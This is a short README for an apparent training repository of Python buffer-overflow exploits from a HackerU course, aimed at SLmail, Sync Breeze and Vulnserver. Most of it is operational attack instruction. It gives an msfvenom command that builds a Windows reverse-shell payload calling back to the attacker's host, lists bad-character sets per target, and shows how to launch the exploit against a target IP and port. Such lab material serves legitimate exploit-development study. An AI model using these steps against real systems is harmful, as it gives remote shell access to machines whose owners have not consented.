# Buffer-Overflow exploits

A repository for HackerU's Buffer overflow exploits in Python :snake:

## Steps to run:

### 1. Generate a payload
Use msfvenom to generate your payload
```python
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=YOUR IP LPORT=YOUR PORT -f python -b "\x00"
```
Bad characters for:
* Slmail:
```python 
\x00\x0a\x0d
```

* Syncbreeze: 
```python 
\x00\x0a\x0d\x25\x26\x2b\x3d
```

* Vulnserver: 
```python 
\x00
```

Append the above payload to the exploit

### 2. Run
Ensure you have Python 2 or 3 installed. Provide the target IP address and port to the file and run:

```python
python slmail.py 172.45.12.37 110
```
